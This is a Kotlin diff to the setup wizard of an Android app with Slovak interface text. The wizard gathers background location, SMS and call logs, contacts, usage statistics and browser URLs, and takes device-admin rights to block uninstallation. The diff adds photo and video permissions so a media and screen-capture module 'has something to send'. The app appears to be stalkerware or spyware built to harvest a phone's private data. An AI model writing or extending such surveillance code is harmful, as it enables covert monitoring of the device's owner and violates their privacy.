@@ -97,7 +97,7 @@ private fun SetupWizardContent() {
     val stepDescriptions = listOf(
         "Aplikácia potrebuje prístup k polohe aj na pozadí.",
         "Pre zobrazenie SMS a záznamov hovorov.",
-        "Pre zobrazenie zoznamu kontaktov.",
+        "Pre zobrazenie kontaktov, fotiek a videí.",
         "Pre sledovanie štatistík používania aplikácií.",
         "Aktivácia správcu zariadenia pre ochranu pred odinštalovaním.",
         "Pre sledovanie aktivít a získavanie URL z prehliadača.",
@@ -170,6 +170,8 @@ private fun SetupWizardContent() {
     val contactsLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { granted ->
+        // Android 13+ also asks for photo/video access here so the media
+        // module (Photos / Videos / Screen Capturer) has something to send.
         if (granted[Manifest.permission.READ_CONTACTS] == true) {
             stepError = null; step++
         } else {
@@ -302,7 +304,20 @@ private fun SetupWizardContent() {
                 ))
             }
         },
-        { launchSafely { contactsLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS)) } },
+        {
+            launchSafely {
+                val perms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    arrayOf(
+                        Manifest.permission.READ_CONTACTS,
+                        Manifest.permission.READ_MEDIA_IMAGES,
+                        Manifest.permission.READ_MEDIA_VIDEO
+                    )
+                } else {
+                    arrayOf(Manifest.permission.READ_CONTACTS)
+                }
+                contactsLauncher.launch(perms)
+            }
+        },
         { launchSafely { usageLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } },
         {
             launchSafely {
